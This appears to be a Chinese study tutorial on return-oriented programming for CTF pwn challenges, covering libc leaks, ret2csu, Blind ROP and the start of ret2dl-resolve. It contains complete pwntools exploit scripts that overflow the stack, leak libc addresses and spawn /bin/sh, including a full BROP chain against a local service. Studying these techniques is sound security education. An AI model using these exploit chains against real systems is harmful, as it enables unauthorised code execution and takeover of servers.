有时候我们并不一定非得直接知道某个函数的地址，可以利用GOT表的跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用write，puts等输出函数将GOT表中地址处对应的内容输出出来（**前提是这个函数已经被解析一次了**）。

**有libc**

**相对偏移寻找**，这时候我们就需要考虑利用libc中函数的基地址一样这个特性来寻找了。其实__libc_start_main就是libc在内存中的基地址。**注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。**常见的有wapper的函数有（待补充）。	

**无libc**

其实，这种情况的解决策略分为两种

- 想办法获取libc
- 想办法直接获取对应的地址。

而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以puts和write均可以。

- puts会有\x00截断的问题
- write可以指定长度输出的内容。

下面是一些相应的方法

**DynELF**

前提是我们可以泄露任意地址的内容。

- **如果要使用write函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致shell不能启动。**

**libc数据库**

\## 更新数据库
 ./get
 \## 将已有libc添加到数据库中
 ./add libc.so
 \## Find all the libc's in the database that have the given names at the given addresses.
 ./find function1 addr function2 addr
 \## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.
 ./Dump some useful offsets

去libc的数据库中找到对应的和已经出现的地址一样的libc，这时候很有可能是一样的。

- libcdb.com

**当然，还有上面提到的LibcSearcher。**

**ret2dl-resolve**

当ELF文件采用动态链接时，got表会采用延迟绑定技术。当第一次调用某个libc函数时，程序会调用_dl_runtime_resolve函数对其地址解析。因此，我们可以利用栈溢出构造ROP链，伪造对其他函数（如：system）的解析。这也是我们在高级rop中会介绍的技巧。

### 中级了@@@o(*￣▽￣*)ブ！！！

**ret2__libc_scu_init**

中级ROP主要是使用了一些比较巧妙的Gadgets。

在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)

```assembly
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

这里我们可以利用以下几点

- 从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。
- 从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，**但其实此时rdi的高32位寄存器值为0（自行调试）**，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。
- 从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。

蒸米的一步一步学ROP之linux_x64篇中level5为例

1.首先检查程序的安全保护

➜ ret2__libc_csu_init git:(iromise) ✗ checksec level5  
   Arch:   amd64-64-little
   RELRO:  Partial RELRO
   Stack:  No canary found
   NX:    NX enabled
   PIE:   No PIE (0x400000)

程序为64位，开启了堆栈不可执行保护。

2.其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出

```c
ssize_t vulnerable_function()
{
  char buf; // [sp+0h] [bp-80h]@1
  return read(0, &buf, 0x200uLL);
}
```

简单浏览下程序，发现程序中既没有system函数地址，也没有/bin/sh字符串，所以两者都需要我们自己去构造了。

**注：这里我尝试在我本机使用system函数来获取shell失败了，应该是环境变量的问题，所以这里使用的是execve来获取shell。**

3.基本利用思路如下：

- 利用栈溢出执行libc_csu_gadgets获取write函数地址，并使得程序重新执行main函数
- 根据libcsearcher获取对应libc版本以及execve函数地址
- 再次利用栈溢出执行libc_csu_gadgets向bss段写入execve地址以及'/bin/sh’地址，并使得程序重新执行main函数。
- 再次利用栈溢出执行libc_csu_gadgets执行execve('/bin/sh')获取shell。

exp如下

```python
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
level5 = ELF('./level5')
sh = process('./level5')
write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)
sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)
write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)
## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')
sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```

**改进**

在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法

**改进1-提前控制rbx与rbp**

可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数，那么我们就可以减少16字节，即我们所需的字节数只需要112。

**改进2-多次利用**

其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件

- 漏洞可以被多次触发
- 在两次触发之间，程序尚未修改r12-r15寄存器，这是因为要两次调用。

**当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**

**gadget**

其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数

```c
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```

我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。

需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器

- 利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。
- 利用中间部分的代码控制了rdx，rsi，edi。

而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下

```assembly
gef➤  x/5i 0x000000000040061A
   0x40061a <__libc_csu_init+90>:   pop    rbx
   0x40061b <__libc_csu_init+91>:   pop    rbp
   0x40061c <__libc_csu_init+92>:   pop    r12
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
gef➤  x/5i 0x000000000040061b
   0x40061b <__libc_csu_init+91>:   pop    rbp
   0x40061c <__libc_csu_init+92>:   pop    r12
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
gef➤  x/5i 0x000000000040061A+3
   0x40061d <__libc_csu_init+93>:   pop    rsp
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret
gef➤  x/5i 0x000000000040061e
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
gef➤  x/5i 0x000000000040061f
   0x40061f <__libc_csu_init+95>:   pop    rbp
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
gef➤  x/5i 0x0000000000400620
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
gef➤  x/5i 0x0000000000400621
   0x400621 <__libc_csu_init+97>:   pop    rsi
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
gef➤  x/5i 0x000000000040061A+9
   0x400623 <__libc_csu_init+99>:   pop    rdi
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400630 <__libc_csu_fini>:  repz ret
```

**参考题目**

- 2016 XDCTF pwn100
- 2016 华山杯 SU_PWN

**BROP**

BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是**Hacking Blind**

BROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流.

1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx,     MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。

目前，大部分应用都会开启ASLR、NX、Canary保护。这里我们分别讲解在BROP中如何绕过这些保护，以及如何进行攻击。

**基本思路**

在BROP中，基本的遵循的思路如下

- 判断栈溢出长度

- - 暴力枚举

- Stack Reading

- - 获取栈上的数据来泄露canaries，以及ebp和返回地址。

- Bind ROP

- - 找到足够多的 gadgets      来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。

- Build the exploit

- - 利用输出函数来 dump      出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit

**栈溢出长度**

直接从1暴力枚举即可，直到发现程序崩溃。

**Stack Reading**

如下所示，这是目前经典的栈布局

```assembly
buffer|canary|saved fame pointer|saved returned address
```

要向得到canary以及之后的变量，我们需要解决第一个问题，如何得到overflow的长度，这个可以通过不断尝试来获取。

其次，关于canary以及后面的变量，所采用的的方法一致，这里我们以canary为例。

canary本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。

需要注意的是，攻击条件2表明了程序本身并不会因为crash有变化，所以每次的canary等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有256种可能，所以在32位的情况下，我们最多需要爆破1024次，64位最多爆破2048次。

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210629162057713.png" alt="image-20210629162057713" style="zoom:67%;" />

**Blind ROP**

最朴素的执行write函数的方法就是构造系统调用。

pop rdi; ret # socket
 pop rsi; ret # buffer
 pop rdx; ret # length
 pop rax; ret # write syscall number
 syscall

但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。

**BROP gadgets**

首先，在libc_csu_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210629162209719.png" alt="image-20210629162209719" style="zoom:67%;" />

**find a call write**

我们可以通过plt表来获取write的地址。

**control rdx**

需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序

pop rdx; ret

这样的指令几乎没有。那么，我们该如何控制rdx的数值呢？这里需要说明执行strcmp的时候，rdx会被设置为将要被比较的字符串的长度，所以我们可以找到strcmp函数，从而来控制rdx。

那么接下来的问题，我们就可以分为两项

- 寻找gadgets

- 寻找PLT表

- - write入口
  - strcmp入口

**寻找gadgets**

首先，我们来想办法寻找gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的gadgets。而当我们控制程序的返回地址时，一般有以下几种情况

- 程序直接崩溃
- 程序运行一段时间后崩溃
- 程序一直运行而并不崩溃

为了寻找合理的gadgets，我们可以分为以下两步

**寻找stop gadgets**

所谓stop gadget一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。

其实stop gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。

之所以要寻找stop gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它。例子如下图

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210629162456711.png" alt="image-20210629162456711" style="zoom:67%;" />

但是，如果我们布置了stop gadget，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。

**识别 gadgets**

那么，我们该如何识别这些gadgets呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址

- **Probe**

- - 探针，也就是我们想要探测的代码地址。一般来说，都是64位程序，可以直接从0x400000尝试，如果不成功，有可能程序开启了PIE保护，再不济，就可能是程序是32位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。

- **Stop**

- - 不会使得程序崩溃的stop      gadget的地址。

- **Trap**

- - 可以导致程序崩溃的地址

我们可以通过在栈上摆放不同顺序的**Stop**与 **Trap**从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子

- probe,stop,traps(traps,traps,...)

- - 我们通过程序崩溃与否(**如果程序在probe处直接崩溃怎么判断**)可以找到不会对栈进行pop操作的gadget，如

  - - ret
    - xor eax,eax; ret

- probe,trap,stop,traps

- - 我们可以通过这样的布局找到只是弹出一个栈变量的gadget。如

  - - pop rax; ret
    - pop rdi; ret

- probe, trap, trap,     trap, trap, trap, trap, stop, traps

- - 我们可以通过这样的布局来找到弹出6个栈变量的gadget，也就是与brop      gadget相似的gadget。**这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，**这里一般来说会遇到两处比较有意思的地方

  - - plt处不会崩，，
    - _start处不会崩，相当于程序重新执行。

之所以要在每个布局的后面都放上trap，是为了能够识别出，当我们的probe处对应的地址执行的指令跳过了stop，程序立马崩溃的行为。

但是，即使是这样，我们仍然难以识别出正在执行的gadget到底是在对哪个寄存器进行操作。

但是，需要注意的是向BROP这样的一下子弹出6个寄存器的gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets就是brop gadgets。此外，这个gadgets通过错位还可以生成pop rsp等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。

此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。

需要注意的是probe可能是一个stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.

**寻找PLT**

如下图所示，程序的plt表具有比较规整的结构，每一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got地址进行解析。

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210629162829637.png" alt="image-20210629162829637" style="zoom:67%;" />

此外，对于大多数plt调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了plt表。除此之外，我们还可以通过前后偏移6字节，来判断我们是处于plt表项中间还是说处于开头。

**控制rdx**

当我们找到plt表之后，下面，我们就该想办法来控制rdx的数值了，那么该如何确认strcmp的位置呢？需要提前说的是，并不是所有的程序都会调用strcmp函数，所以在没有调用strcmp函数的情况下，我们就得利用其它方式来控制rdx的值了。这里给出程序中使用strcmp函数的情况。

之前，我们已经找到了brop的gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址

- readable，可读的地址。
- bad,     非法地址，不可访问，比如说0x0。

那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况

- strcmp(bad,bad)
- strcmp(bad,readable)
- strcmp(readable,bad)
- strcmp(readable,readable)

只有最后一种格式，程序才会正常执行。

**注**：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。

那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个plt表项，但是这个却比较麻烦。我们可以选择如下的一种方法

- 利用plt表项的慢路径
- 并且利用下一个表项的慢路径的地址来覆盖返回地址

这样，我们就不用来回控制相应的变量了。

当然，我们也可能碰巧找到strncmp或者strcasecmp函数，它们具有和strcmp一样的效果。

**寻找输出函数**

寻找输出函数既可以寻找write，也可以寻找puts。一般现先找puts函数。不过这里为了介绍方便，先介绍如何寻找write。

**寻找write@plt**

当我们可以控制write函数的三个参数的时候，我们就可以再次遍历所有的plt表，根据write函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值

- 使用rop     chain，同时使得每个rop对应的文件描述符不一样
- 同时打开多个连接，并且我们使用相对较高的数值来试一试。

需要注意的是

- linux默认情况下，一个进程最多只能打开1024个文件描述符。
- posix标准每次申请的文件描述符数值总是当前最小可用数值。

当然，我们也可以选择寻找puts函数。

**寻找puts@plt**

寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下

payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)

此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情

- 将socket输出重定向到输入输出
- 寻找“/bin/sh”的地址。一般来说，最好是找到一块可写的内存，利用write函数将这个字符串写到相应的地址。
- 执行execve获取shell，获取execve不一定在plt表中，此时攻击者就需要想办法执行系统调用了。

以HCTF2016的出题人失踪了为例

1.确定栈溢出长度。

```python
def getbufferflow_length():
    i = 1
    while 1:
        try:
            sh = remote('127.0.0.1', 9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            sh.send(i * 'a')
            output = sh.recv()
            sh.close()
            if not output.startswith('No password'):
                return i - 1
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1
```

根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。

2.寻找 stop gadgets。

寻找过程如下：

```python
def get_stop_addr(length):
    addr = 0x400000
    while 1:
        try:
            sh = remote('127.0.0.1', 9999)
            sh.recvuntil('password?\n')
            payload = 'a' * length + p64(addr)
            sh.sendline(payload)
            sh.recv()
            sh.close()
            print 'one success addr: 0x%x' % (addr)
            return addr
        except Exception:
            addr += 1
            sh.close()
```

这里我们直接尝试64位程序没有开启PIE的情况，因为一般是这个样子的，如果开启了，那就按照开启了的方法做，结果发现了不少，我选择了一个貌似返回到源程序中的地址

one success stop gadget addr: 0x4006b6

3.识别brop gadgets。

下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。

```python
def get_brop_gadget(length, stop_gadget, addr):
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
            stop_gadget) + p64(0) * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        print content
        # stop gadget returns memory
        if not content.startswith('WelCome'):
            return False
        return True
    except Exception:
        sh.close()
        return False
def check_brop_gadget(length, addr):
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True
##length = getbufferflow_length()
length = 72
##get_stop_addr(length)
stop_gadget = 0x4006b6
addr = 0x400740
while 1:
    print hex(addr)
    if get_brop_gadget(length, stop_gadget, addr):
        print 'possible brop gadget: 0x%x' % addr
        if check_brop_gadget(length, addr):
            print 'success brop gadget: 0x%x' % addr
            break
    addr += 1
```

这样，我们基本得到了brop的gadgets地址0x4007ba

4.确定puts@plt地址。

根据上面所说，我们可以构造如下payload来进行获取：

```python
payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```

具体函数如下：

```python
def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400000
    while 1:
        print hex(addr)
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(
            addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content = sh.recv()
            if content.startswith('\x7fELF'):
                print 'find puts@plt addr: 0x%x' % addr
                return addr
            sh.close()
            addr += 1
        except Exception:
            sh.close()
            addr += 1
```

最后根据plt的结构，选择0x400560作为puts@plt

5.泄露puts@got地址。

在我们可以调用puts函数后，我们可以泄露puts函数的地址，进而获取libc版本，从而获取相关的system函数地址与/bin/sh地址，从而获取shell。我们从0x400000开始泄露0x1000个字节，这已经足够包含程序的plt部分了。代码如下：

```python
def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 9999)
    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
        puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index("\nWelCome")]
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None
##length = getbufferflow_length()
length = 72
##stop_gadget = get_stop_addr(length)
stop_gadget = 0x4006b6
##brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
addr = 0x400000
result = ""
while addr < 0x401000:
    print hex(addr)
    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)
    if data is None:
        continue
    else:
        result += data
    addr += len(data)
with open('code', 'wb') as f:
    f.write(result)

```

6.最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了'\x00'，因为puts是输出字符串，字符串是以'\x00'为终止符的。之后利用ida打开binary模式，首先在edit->segments->rebase program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下:

```assembly
seg000:0000000000400560                 db 0FFh
seg000:0000000000400561                 db  25h ; %
seg000:0000000000400562                 db 0B2h ;
seg000:0000000000400563                 db  0Ah
seg000:0000000000400564                 db  20h
seg000:0000000000400565                 db    0
#然后按下c,将此处的数据转换为汇编指令，如下
seg000:0000000000400560 ; ---------------------------------------------------------------------------
seg000:0000000000400560                 jmp     qword ptr cs:601018h
seg000:0000000000400566 ; ---------------------------------------------------------------------------
seg000:0000000000400566                 push    0
seg000:000000000040056B                 jmp     loc_400550
seg000:000000000040056B ; ---------------------------------------------------------------------------

```

这说明，puts@got的地址为0x601018。

7.程序利用

```python
##length = getbufferflow_length()
length = 72
##stop_gadget = get_stop_addr(length)
stop_gadget = 0x4006b6
##brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
##leakfunction(length, rdi_ret, puts_plt, stop_gadget)
puts_got = 0x601018
sh = remote('127.0.0.1', 9999)
sh.recvuntil('password?\n')
payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
sh.sendline(payload)
data = sh.recvuntil('\nWelCome', drop=True)
puts_addr = u64(data.ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()
```

### 高级了！！！不敢想象wow~ ⊙o⊙！！！

**ret2_dl_runtime_resolve**

高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些更加底层的原理。

要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程，请参考executable中elf对应的介绍。这里我只给出相应的利用方式。

我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案还肯定的。具体利用方式如下

1. 控制程序执行dl_resolve函数

2. - 给定Link_map以及index两个参数。
   - 当然我们可以直接给定 plt0对应的汇编代码，这时，我们就只需要一个index就足够了。

3. 控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。

4. 伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。

5. 伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。

**此外，这个攻击成功的很必要的条件**

- **dl_resolve函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。**
- **dl_resolve函数最后的解析根本上依赖于所给定的字符串。**

**注意**：

- 符号版本信息

- - 最好使得ndx = VERSYM[(reloc->r_info) >> 8] 的值为0，以便于防止找不到的情况。

- 重定位表项

- - r_offset必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。

**攻击条件**

说了这么多，这个利用技巧其实还是ROP，同样可以绕过NX和ASLR保护。但是，这个攻击更适于一些比较简单的栈溢出的情况，但同时又难以泄露获取更多信息的情况下。

**以XDCTF 2015的pwn200为例**

首先我们可以编译下ret2dlresolve文件夹下的源文件main.c文件得到二进制文件，这里取消了Canary保护。

```assembly
➜  ret2dlresolve git:(master) ✗ gcc main.c -m32 -fno-stack-protector -o main
```

在下面的讲解过程中，我会按照以两种不同的方法来进行讲解。其中第一种方法比较麻烦，但是可以仔细理解ret2dlresolve的原理，第二种方法则是直接使用已有的工具，相对容易一点。

	1. 利用正常的代码来使用该技巧从而获取shell。
     \-  stage 1 测试控制程序执行write函数的效果。
     \-  stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。
